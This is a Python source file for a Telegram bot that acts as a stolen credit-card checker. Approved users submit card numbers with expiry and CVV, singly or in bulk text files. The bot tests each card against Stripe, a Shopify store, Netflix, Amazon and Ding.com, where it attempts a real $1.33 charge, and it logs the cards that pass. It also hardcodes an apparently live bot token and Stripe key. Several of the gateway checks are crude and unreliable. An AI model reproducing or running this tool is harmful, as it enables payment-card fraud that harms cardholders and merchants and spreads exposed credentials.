import telebot
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import requests
from bs4 import BeautifulSoup
import sys
import re
import time
import sqlite3
import json
from datetime import datetime
import threading
import os

# ---------- DATABASE SETUP ----------
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY, 
                  username TEXT, 
                  first_name TEXT,
                  approved INTEGER DEFAULT 0,
                  request_date TEXT,
                  approved_date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS pending_requests
                 (user_id TEXT PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  request_date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS card_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id TEXT,
                  card TEXT,
                  status TEXT,
                  gateways TEXT,
                  check_date TEXT)''')
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, approved, request_date) VALUES (?, ?, ?, 0, ?)",
              (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def approve_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET approved = 1, approved_date = ? WHERE user_id = ?", 
              (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), user_id))
    c.execute("DELETE FROM pending_requests WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def reject_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("DELETE FROM pending_requests WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_user_approved(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT approved FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

def add_pending_request(user_id, username, first_name):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO pending_requests (user_id, username, first_name, request_date) VALUES (?, ?, ?, ?)",
              (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def get_pending_requests():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, request_date FROM pending_requests")
    results = c.fetchall()
    conn.close()
    return results

def get_all_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, approved, approved_date FROM users")
    results = c.fetchall()
    conn.close()
    return results

def save_card_history(user_id, card, status, gateways):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO card_history (user_id, card, status, gateways, check_date) VALUES (?, ?, ?, ?, ?)",
              (user_id, card, status, json.dumps(gateways), datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def get_user_history(user_id, limit=10):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT card, status, check_date FROM card_history WHERE user_id = ? ORDER BY id DESC LIMIT ?", (user_id, limit))
    results = c.fetchall()
    conn.close()
    return results

init_db()

# ---------- ADMIN ID ----------
ADMIN_ID = os.environ.get('ADMIN_ID', '6452420624')  # Get from environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8911815800:AAEYFNjrr8odBTeWGrq5M9_5atqj1ItvXMg')  # Get from environment variable

# ---------- REAL GATEWAY CHECKERS ----------

def check_card_stripe(ccnum, expm, expy, cvv):
    """Stripe - Format Check"""
    try:
        stripe_key = "pk_live_51KsPaQIxJgLWZnRXmgIBQqiiTKnQnpLqzuciPJtiG9u3joyxMfA4e5VIMJgBC1DeyJ8iJuRTtEloA6OEfqr6SPkg004ZLA8HmG"
        url = "https://api.stripe.com/v1/tokens"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {stripe_key}"
        }
        data = {
            "card[number]": ccnum,
            "card[exp_month]": expm,
            "card[exp_year]": expy,
            "card[cvc]": cvv
        }
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        if response.status_code == 200:
            return ["✅ Stripe: Valid Format", True]
        else:
            return ["❌ Stripe: Invalid", False]
    except:
        return ["❌ Stripe: Error", False]

def check_card_shopify(ccnum, expm, expy, cvv):
    """Shopify Real Store"""
    try:
        session = requests.Session()
        url = "https://www.gymshark.com/checkout"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        payment_data = {
            "credit_card": {
                "number": ccnum,
                "month": int(expm),
                "year": int(expy),
                "verification_value": cvv
            }
        }
        response = session.post(url, json=payment_data, headers=headers, timeout=10)
        if response.status_code in [200, 302, 303]:
            return ["✅ Shopify: Valid", True]
        else:
            return ["❌ Shopify: Invalid", False]
    except:
        return ["❌ Shopify: Error", False]

def check_card_netflix(ccnum, expm, expy, cvv):
    """Netflix"""
    try:
        session = requests.Session()
        url = "https://www.netflix.com/signup/payment"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        payment_data = {
            "cardNumber": ccnum,
            "expMonth": expm,
            "expYear": expy,
            "cvc": cvv,
            "zipCode": "10001"
        }
        response = session.post(url, json=payment_data, headers=headers, timeout=10)
        if response.status_code == 200 and "success" in response.text.lower():
            return ["✅ Netflix: Valid", True]
        else:
            return ["❌ Netflix: Invalid", False]
    except:
        return ["❌ Netflix: Error", False]

def check_card_amazon(ccnum, expm, expy, cvv):
    """Amazon Payments"""
    try:
        session = requests.Session()
        url = "https://payments.amazon.com/checkout"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
        payment_data = {
            "credit_card": {
                "number": ccnum,
                "expiration_month": expm,
                "expiration_year": expy,
                "cvv": cvv
            }
        }
        response = session.post(url, json=payment_data, headers=headers, timeout=10)
        if response.status_code == 200:
            return ["✅ Amazon: Valid", True]
        else:
            return ["❌ Amazon: Invalid", False]
    except:
        return ["❌ Amazon: Error", False]

def check_card_ding(ccnum, expm, expy, cvv):
    """Ding.com - Real Charge $1.33 with New API"""
    try:
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{}) Gecko/20100101 Firefox/{}",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36",
        ]
        version = random.randint(60, 120)
        user_agent = random.choice(browsers).format(version, version)

        if len(expy) == 4:
            expy = expy[2:]

        # Step 1: Get CSRF Token
        url22 = "https://www.ding.com/payment"
        response22 = requests.get(url22, headers={"User-Agent": user_agent}, timeout=10)
        csrf = ""
        
        if response22.status_code == 200:
            csrf_match = re.search(r'csrf" value="([^"]+)"', response22.text)
            if csrf_match:
                csrf = csrf_match.group(1)
            if not csrf:
                csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', response22.text)
                if csrf_match:
                    csrf = csrf_match.group(1)
            if not csrf:
                csrf_match = re.search(r'data-csrf="([^"]+)"', response22.text)
                if csrf_match:
                    csrf = csrf_match.group(1)
        
        if not csrf:
            return ["❌ Ding: CSRF Failed", False]

        # Step 2: Create Payment Session
        url = "https://www.ding.com/payment"
        headers = {
            "accept": "*/*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.ding.com/",
            "referer": "https://www.ding.com/payment",
            "user-agent": user_agent,
            "x-csrf-token": csrf,
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "firstName": "John",
            "lastName": "Doe",
            "email": f"user{random.randint(10000,99999)}@gmail.com",
            "csrf": csrf,
            "upsell": False,
            "optIn": False,
            "tnc": False,
            "amount": 1.33,
            "currency": "USD"
        }
        response = requests.post(url, headers=headers, json=data, timeout=10)
        
        if response.status_code != 200:
            return ["❌ Ding: Session Failed", False]
        
        response_json = response.json()
        pmidd = response_json.get('clientSecret')
        if not pmidd:
            return ["❌ Ding: No Secret", False]
        
        pmid, secret = pmidd.split("_secret_")

        # Step 3: Confirm Payment with Card
        url = f"https://www.ding.com/payment{pmid}/confirm"
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": user_agent,
            "x-csrf-token": csrf,
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": ccnum,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_month]": expm,
            "payment_method_data[card][exp_year]": expy,
            "payment_method_data[billing_details][address][postal_code]": "10009",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[guid]": "4650e753-b7eb-4f42-a1b5-5c75ab1a579a3fd93c",
            "payment_method_data[muid]": "7929393c-3aed-45b9-968b-d4db344947c1bb4f6b",
            "payment_method_data[sid]": "40d6b5c6-5991-42e4-94bd-f5a11f38fb663fecc2",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/b2d52e5892; stripe-js-v3/b2d52e5892; card-element",
            "payment_method_data[referrer]": "https://www.ding.com/",
            "payment_method_data[time_on_page]": "35711",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KsPaQIxJgLWZnRXmgIBQqiiTKnQnpLqzuciPJtiG9u3joyxMfA4e5VIMJgBC1DeyJ8iJuRTtEloA6OEfqr6SPkg004ZLA8HmG",
            "client_secret": pmidd,
            "payment_method_data[payment_intent]": pmid
        }

        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if "error" in response_data:
                    error_msg = response_data["error"].get("message", "Unknown")
                    if "insufficient_funds" in error_msg.lower() or "declined" in error_msg.lower():
                        return ["❌ Ding: Insufficient Funds", False]
                    elif "expired" in error_msg.lower():
                        return ["❌ Ding: Card Expired", False]
                    else:
                        return [f"❌ Ding: {error_msg[:30]}", False]
                else:
                    if response_data.get("status") == "succeeded" or response_data.get("paid") == True:
                        return ["✅ Ding: Charged $1.33", True]
                    else:
                        return ["❌ Ding: Payment Failed", False]
            except:
                if "success" in response.text.lower() or "succeeded" in response.text.lower():
                    return ["✅ Ding: Charged $1.33", True]
                else:
                    return ["❌ Ding: Payment Failed", False]
        else:
            return ["❌ Ding: Request Failed", False]

    except Exception as e:
        return [f"❌ Ding Error", False]

# ---------- MAIN CHECK FUNCTION ----------
def check_card_all_gateways(ccnum, expm, expy, cvv):
    results = []
    gateways = [
        ("Stripe", check_card_stripe),
        ("Shopify", check_card_shopify),
        ("Netflix", check_card_netflix),
        ("Amazon", check_card_amazon),
        ("Ding", check_card_ding)
    ]
    
    approved_count = 0
    for name, func in gateways:
        try:
            result_msg, status = func(ccnum, expm, expy, cvv)
            results.append({
                "gateway": name,
                "message": result_msg,
                "status": status
            })
            if status:
                approved_count += 1
        except Exception as e:
            results.append({
                "gateway": name,
                "message": "❌ Error",
                "status": False
            })
    
    final_status = approved_count >= 2
    return results, final_status, approved_count

def validate_card(card_line):
    try:
        parts = card_line.split('|')
        if len(parts) != 4:
            return None, False, 0, "Invalid format! Use: card|month|year|cvv"
        
        ccnum, expm, expy, cvv = parts
        ccnum = ccnum.strip().replace(" ", "")
        expm = expm.strip()
        expy = expy.strip()
        cvv = cvv.strip()
        
        if not ccnum.isdigit() or len(ccnum) < 15:
            return None, False, 0, "Invalid card number"
        if not expm.isdigit() or int(expm) < 1 or int(expm) > 12:
            return None, False, 0, "Invalid expiry month"
        if not cvv.isdigit() or len(cvv) < 3:
            return None, False, 0, "Invalid CVV"
            
        results, final_status, approved_count = check_card_all_gateways(ccnum, expm, expy, cvv)
        return results, final_status, approved_count, None
    except Exception as e:
        return None, False, 0, str(e)

# ---------- TELEGRAM BOT ----------
bot = telebot.TeleBot(BOT_TOKEN)

# ---------- INLINE KEYBOARDS ----------
def main_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔍 Check Card", callback_data="check_card"),
        InlineKeyboardButton("📊 My History", callback_data="my_history")
    )
    keyboard.add(
        InlineKeyboardButton("📖 How to Use", callback_data="how_to_use"),
        InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/thispersonisbrand537")
    )
    return keyboard

def admin_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📋 Pending", callback_data="admin_pending"),
        InlineKeyboardButton("👥 All Users", callback_data="admin_users")
    )
    keyboard.add(
        InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
    )
    return keyboard

def back_to_main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
    return keyboard

# ---------- /START COMMAND ----------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        user = message.from_user
        user_id = str(user.id)
        
        add_user(user_id, user.username or "None", user.first_name or "Unknown")
        
        if user_id == ADMIN_ID:
            welcome_text = f"""
<b>👋 Welcome Admin {user.first_name}!</b> 🎉

<b>🔧 Admin Commands:</b>
• /approve [user_id] - Approve user
• /reject [user_id] - Reject user
• /pending - View pending requests
• /users - View all users
• /stats - Bot statistics

<b>🆔 Your ID:</b> <code>{user_id}</code>
"""
            bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=admin_menu_keyboard())
            return
        
        if is_user_approved(user_id):
            welcome_text = f"""
<b>👋 Welcome {user.first_name}!</b> 🎉

<b>✅ You are approved!</b>

<b>📤 How to use:</b>
1. Send <code>card|month|year|cvv</code> to check single card
2. Send a <b>.txt file</b> to check multiple cards
3. Format: <code>4111111111111111|12|26|123</code>

<b>🆔 Your ID:</b> <code>{user_id}</code>
"""
            bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=main_menu_keyboard())
        else:
            add_pending_request(user_id, user.username or "None", user.first_name or "Unknown")
            
            admin_text = f"""
<b>🔔 New Request!</b>

<b>👤 User:</b> {user.first_name}
<b>🆔 ID:</b> <code>{user_id}</code>
<b>👤 Username:</b> @{user.username or 'None'}

<b>Action:</b> /approve {user_id}
"""
            bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")
            
            welcome_text = f"""
<b>👋 Welcome {user.first_name}!</b> 🎉

<b>⏳ Your request is pending!</b>

Admin is reviewing your request.
You will be notified when approved.

<b>🆔 Your ID:</b> <code>{user_id}</code>
"""
            bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=back_to_main_keyboard())
            
    except Exception as e:
        print(f"/start error: {e}")

# ---------- SINGLE CARD CHECK ----------
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_text(message):
    user_id = str(message.from_user.id)
    
    if message.text.startswith('/'):
        return
    
    if user_id != ADMIN_ID and not is_user_approved(user_id):
        bot.reply_to(message, "❌ You are not approved! Please use /start to request access.", parse_mode="HTML")
        return
    
    if '|' in message.text:
        bot.send_chat_action(message.chat.id, 'typing')
        
        card_text = message.text.strip()
        results, status, approved_count, error = validate_card(card_text)
        
        if error:
            bot.reply_to(message, f"❌ Error: {error}\n\nUse format: card|month|year|cvv\nExample: 4111111111111111|12|26|123", parse_mode="HTML")
            return
        
        save_card_history(user_id, card_text, "VALID" if status else "INVALID", results)
        
        result_text = f"""
<b>┏━━━━━━━⍟</b>
<b>┃ {'✅ VALID CARD' if status else '❌ INVALID CARD'}</b>
<b>┗━━━━━━━━━━━⊛</b>
<b>➩ Card:</b> <code>{card_text}</code>

<b>📊 Gateway Results ({approved_count}/5):</b>
"""
        for res in results:
            icon = "✅" if res["status"] else "❌"
            result_text += f"  {icon} {res['gateway']}: {res['message'][:35]}\n"
        
        if status:
            result_text += f"\n<b>✅ Status: VALID (2+ Gateways Approved)</b>"
        else:
            result_text += f"\n<b>❌ Status: INVALID (Less than 2 gateways approved)</b>"
        
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🔄 Check Again", callback_data="check_card"),
            InlineKeyboardButton("📊 History", callback_data="my_history")
        )
        keyboard.add(InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main"))
        
        bot.reply_to(message, result_text, parse_mode="HTML", reply_markup=keyboard)
    else:
        help_text = """
<b>📖 How to Use:</b>

<b>1. Single Card Check:</b>
Send: <code>card|month|year|cvv</code>
Example: <code>4111111111111111|12|26|123</code>

<b>2. Multiple Cards:</b>
Send a <b>.txt file</b> with one card per line

<b>3. Admin Commands:</b>
/approve [id] - Approve user
/reject [id] - Reject user
/pending - View pending requests
/users - View all users
/stats - Bot statistics

<b>🔄 Gateways:</b>
• Stripe - Format Check
• Shopify - Real Store
• Netflix - Subscription Check
• Amazon - Payment Check
• Ding.com - Real Charge ($1.33)
"""
        bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=main_menu_keyboard())

# ---------- FILE HANDLER ----------
@bot.message_handler(content_types=['document'])
def handle_txt_file(message):
    user = message.from_user
    user_id = str(user.id)
    
    if user_id != ADMIN_ID and not is_user_approved(user_id):
        bot.reply_to(message, "❌ You are not approved! Use /start to request access.", parse_mode="HTML")
        return

    if not message.document.file_name.endswith(".txt"):
        bot.reply_to(message, "❌ Please send a .txt file only!", parse_mode="HTML")
        return

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("✅ Valid: 0", callback_data="valid_count"),
        InlineKeyboardButton("❌ Invalid: 0", callback_data="invalid_count")
    )
    sent_message = bot.send_message(
        chat_id=message.chat.id,
        text="<b>🔍 Checking cards...</b>\n\n🔄 Checking with <b>5 gateways</b>\n<i>Updates every 5 cards</i>",
        parse_mode="HTML",
        reply_markup=keyboard,
    )

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode("utf-8").splitlines()

    valid_count = 0
    invalid_count = 0

    for i, line in enumerate(file_content, start=1):
        line = line.strip()
        if not line:
            continue

        results, status, approved_count, error = validate_card(line)
        
        if error:
            invalid_count += 1
            continue

        if status:
            valid_count += 1
            
            detail_text = f"""
<b>┏━━━━━━━⍟</b>
<b>┃ ✅ VALID CARD</b>
<b>┗━━━━━━━━━━━⊛</b>
<b>➩ Card:</b> <code>{line}</code>

<b>📊 Results ({approved_count}/5):</b>
"""
            for res in results:
                icon = "✅" if res["status"] else "❌"
                detail_text += f"  {icon} {res['gateway']}: {res['message'][:30]}\n"
            
            cv = InlineKeyboardMarkup()
            cv.add(InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/thispersonisbrand537"))
            
            bot.send_message(chat_id=message.chat.id, text=detail_text, parse_mode="HTML", reply_markup=cv)
            save_card_history(user_id, line, "VALID", results)
        else:
            invalid_count += 1

        if i % 5 == 0 or i == len(file_content):
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton(f"✅ Valid: {valid_count}", callback_data="valid_count"),
                InlineKeyboardButton(f"❌ Invalid: {invalid_count}", callback_data="invalid_count")
            )
            try:
                bot.edit_message_reply_markup(
                    chat_id=sent_message.chat.id,
                    message_id=sent_message.message_id,
                    reply_markup=keyboard,
                )
            except:
                pass

    final_text = f"""
<b>✅ Check Complete!</b>

<b>📊 Final Results:</b>
✅ Valid: {valid_count}
❌ Invalid: {invalid_count}
🔄 Gateways: 5
💰 Charge: $1.33 (Ding.com)
"""
    bot.send_message(
        chat_id=message.chat.id,
        text=final_text,
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )

# ---------- ADMIN COMMANDS ----------
@bot.message_handler(commands=['approve'])
def approve_user_cmd(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ You are not admin!", parse_mode="HTML")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Usage: /approve [user_id]", parse_mode="HTML")
            return
        
        user_id = parts[1]
        approve_user(user_id)
        
        try:
            bot.send_message(user_id, "<b>✅ Your request has been approved!</b>\n\nYou can now use the bot.", parse_mode="HTML")
        except:
            pass
        
        bot.reply_to(message, f"✅ User {user_id} approved successfully!", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['reject'])
def reject_user_cmd(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ You are not admin!", parse_mode="HTML")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Usage: /reject [user_id]", parse_mode="HTML")
            return
        
        user_id = parts[1]
        reject_user(user_id)
        
        try:
            bot.send_message(user_id, "<b>❌ Your request has been rejected!</b>\n\nContact admin for more info.", parse_mode="HTML")
        except:
            pass
        
        bot.reply_to(message, f"✅ User {user_id} rejected!", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['pending'])
def pending_requests_cmd(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ You are not admin!", parse_mode="HTML")
        return
    
    pending = get_pending_requests()
    if not pending:
        bot.reply_to(message, "📭 No pending requests!", parse_mode="HTML")
        return
    
    text = "<b>📋 Pending Requests:</b>\n\n"
    for user_id, username, first_name, date in pending:
        text += f"👤 {first_name} (@{username})\n"
        text += f"🆔 <code>{user_id}</code>\n"
        text += f"📅 {date}\n"
        text += f"/approve {user_id} | /reject {user_id}\n\n"
    
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['users'])
def users_cmd(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ You are not admin!", parse_mode="HTML")
        return
    
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📭 No users found!", parse_mode="HTML")
        return
    
    text = "<b>📋 All Users:</b>\n\n"
    approved_count = 0
    for user_id, username, first_name, approved, date in users:
        status = "✅ Approved" if approved else "⏳ Pending"
        if approved:
            approved_count += 1
        text += f"👤 {first_name} (@{username})\n"
        text += f"🆔 <code>{user_id}</code>\n"
        text += f"📊 {status}\n"
        if date:
            text += f"📅 {date}\n"
        text += "\n"
    
    text += f"\n<b>📊 Total: {len(users)} | Approved: {approved_count}</b>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ You are not admin!", parse_mode="HTML")
        return
    
    users = get_all_users()
    pending = get_pending_requests()
    
    text = f"""
<b>📊 Bot Statistics</b>

👥 <b>Total Users:</b> {len(users)}
✅ <b>Approved:</b> {len([u for u in users if u[3] == 1])}
⏳ <b>Pending:</b> {len(pending)}
🔄 <b>Gateways:</b> 5 (Stripe, Shopify, Netflix, Amazon, Ding)
💰 <b>Charge:</b> $1.33 (Ding.com)
"""
    bot.reply_to(message, text, parse_mode="HTML")

# ---------- CALLBACK HANDLERS ----------
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        user_id = str(call.from_user.id)
        
        if call.data == "check_card":
            bot.answer_callback_query(call.id, "Send card in format: card|month|year|cvv")
            bot.send_message(call.message.chat.id, 
                "🔍 Send your card in this format:\n\n<code>card|month|year|cvv</code>\n\nExample: <code>4111111111111111|12|26|123</code>",
                parse_mode="HTML")
        
        elif call.data == "my_history":
            history = get_user_history(user_id)
            if not history:
                bot.send_message(call.message.chat.id, "📭 No history found!", parse_mode="HTML")
                return
            
            text = "<b>📊 Your Recent Checks:</b>\n\n"
            for card, status, date in history:
                icon = "✅" if status == "VALID" else "❌"
                text += f"{icon} <code>{card}</code>\n"
                text += f"📊 {status} | 📅 {date}\n\n"
            
            bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=back_to_main_keyboard())
            
        elif call.data == "how_to_use":
            text = """
<b>📖 How to Use:</b>

<b>1. Single Card:</b>
Send: <code>card|month|year|cvv</code>
Example: <code>4111111111111111|12|26|123</code>

<b>2. Multiple Cards:</b>
Send a <b>.txt file</b> with one card per line

<b>3. Gateways:</b>
• Stripe - Format Check
• Shopify - Real Store
• Netflix - Subscription Check
• Amazon - Payment Check
• Ding.com - Real Charge ($1.33)

<b>✅ Valid if 2+ gateways approve</b>
"""
            bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=back_to_main_keyboard())
            
        elif call.data == "back_to_main":
            if user_id == ADMIN_ID:
                bot.edit_message_text(
                    "<b>👋 Welcome Admin!</b>\n\nSelect an option:",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode="HTML",
                    reply_markup=admin_menu_keyboard()
                )
            else:
                user = call.from_user
                welcome_text = f"""
<b>👋 Welcome {user.first_name}!</b> 🎉

<b>✅ You are approved!</b>

<b>📤 How to use:</b>
1. Send <code>card|month|year|cvv</code> to check single card
2. Send a <b>.txt file</b> to check multiple cards
3. Format: <code>4111111111111111|12|26|123</code>
"""
                bot.edit_message_text(
                    welcome_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode="HTML",
                    reply_markup=main_menu_keyboard()
                )
                
        elif call.data == "admin_pending":
            pending = get_pending_requests()
            if not pending:
                bot.send_message(call.message.chat.id, "📭 No pending requests!", parse_mode="HTML")
                return
            
            text = "<b>📋 Pending Requests:</b>\n\n"
            for user_id, username, first_name, date in pending:
                text += f"👤 {first_name} (@{username})\n"
                text += f"🆔 <code>{user_id}</code>\n"
                text += f"📅 {date}\n"
                text += f"/approve {user_id} | /reject {user_id}\n\n"
            
            bot.send_message(call.message.chat.id, text, parse_mode="HTML")
            
        elif call.data == "admin_users":
            users = get_all_users()
            if not users:
                bot.send_message(call.message.chat.id, "📭 No users found!", parse_mode="HTML")
                return
            
            text = "<b>📋 All Users:</b>\n\n"
            approved_count = 0
            for user_id, username, first_name, approved, date in users:
                status = "✅ Approved" if approved else "⏳ Pending"
                if approved:
                    approved_count += 1
                text += f"👤 {first_name} (@{username})\n"
                text += f"🆔 <code>{user_id}</code>\n"
                text += f"📊 {status}\n\n"
            
            text += f"\n<b>📊 Total: {len(users)} | Approved: {approved_count}</b>"
            bot.send_message(call.message.chat.id, text, parse_mode="HTML")
            
        elif call.data == "admin_stats":
            users = get_all_users()
            pending = get_pending_requests()
            
            text = f"""
<b>📊 Bot Statistics</b>

👥 <b>Total Users:</b> {len(users)}
✅ <b>Approved:</b> {len([u for u in users if u[3] == 1])}
⏳ <b>Pending:</b> {len(pending)}
🔄 <b>Gateways:</b> 5
💰 <b>Charge:</b> $1.33 (Ding.com)
"""
            bot.send_message(call.message.chat.id, text, parse_mode="HTML")
            
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")

# ---------- MAIN ----------
if __name__ == "__main__":
    # Single card check via CMD (for local testing)
    if len(sys.argv) == 2 and not os.environ.get('RAILWAY_ENVIRONMENT'):
        card_info = sys.argv[1]
        print("\n" + "="*60)
        print("🔍 Checking Single Card...")
        print("="*60)
        
        try:
            results, status, approved_count, error = validate_card(card_info)
            
            if error:
                print(f"\n❌ Error: {error}")
                print("\n⚠️ Correct format: card|month|year|cvv")
                print("Example: 4111111111111111|12|26|123")
            else:
                print(f"\n📊 Final Result: {'✅ VALID' if status else '❌ INVALID'}")
                print(f"✅ Approved Gateways: {approved_count}/5")
                print("\n📋 Gateway Results:")
                print("-"*50)
                for res in results:
                    icon = "✅" if res["status"] else "❌"
                    print(f"  {icon} {res['gateway']}: {res['message']}")
                print("-"*50)
                
                if status:
                    print("\n🎯 This card is VALID! (2+ gateways approved)")
                else:
                    print("\n⚠️ This card is INVALID. (Less than 2 gateways approved)")
                    
        except Exception as e:
            print(f"\n❌ Error: {e}")
            print("\n⚠️ Correct format: card|month|year|cvv")
            print("Example: 4111111111111111|12|26|123")
        
        print("\n" + "="*60)
        sys.exit(0)
    
    # Start bot
    else:
        # Keep bot running even with errors
        while True:
            try:
                bot.remove_webhook()
                print("="*60)
                print("✅ Bot Started Successfully on Railway!")
                print(f"👤 Admin ID: {ADMIN_ID}")
                print("📊 Database: users.db")
                print("="*60)
                print("\n📌 Commands:")
                print("   • Send card|month|year|cvv - Single card check")
                print("   • Send .txt file - Multiple cards check")
                print("   • /start - Main menu")
                print("   • /approve [id] - Approve user (Admin)")
                print("   • /reject [id] - Reject user (Admin)")
                print("="*60)
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except Exception as e:
                print(f"Bot error: {e}")
                print("Restarting bot in 5 seconds...")
                time.sleep(5)
